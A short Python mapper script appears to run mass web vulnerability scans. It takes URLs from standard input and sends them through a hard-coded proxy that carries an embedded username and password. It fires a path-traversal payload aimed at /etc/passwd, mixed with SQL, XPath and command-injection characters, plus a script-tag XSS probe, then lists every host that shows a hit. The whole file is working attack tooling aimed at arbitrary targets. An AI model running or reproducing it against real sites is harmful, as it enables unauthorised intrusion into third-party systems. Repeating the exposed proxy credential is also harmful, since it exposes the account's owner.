#!/usr/bin/python

from urlparse import urlparse
import sys
from massweb.fuzzers.get_fuzzer import GetFuzzer

def mapper():

    gf = GetFuzzer(num_threads = 5, proxy_list = [{"http" : "http://acaceres:DgXQdVjG@50.118.140.240:29842"}])
    gf.add_payload_from_string("../../../../../../../../../../../../../../../../../../../../etc/passwd#--'@!\\", check_type_list = ["mxi", "sqli", "xpathi", "trav", "osci"])
    gf.add_payload_from_string('"><ScRipT>alert(31337)</ScrIpT>', check_type_list = ["xss"])

    for line in sys.stdin:

        try:
            line = line.strip()
            gf.add_target_from_url(line)

        except:
            sys.stderr.write("Failed to add line to targets!\n")

    for r in gf.fuzz():

        try:
            if True in r.result_dic.values():
                print urlparse(r.fuzzy_target.url).netloc + "\t" + str(r)
        except:
            sys.stderr.write("Failed to fuzz a target!\n")

if __name__ == "__main__":

    mapper()

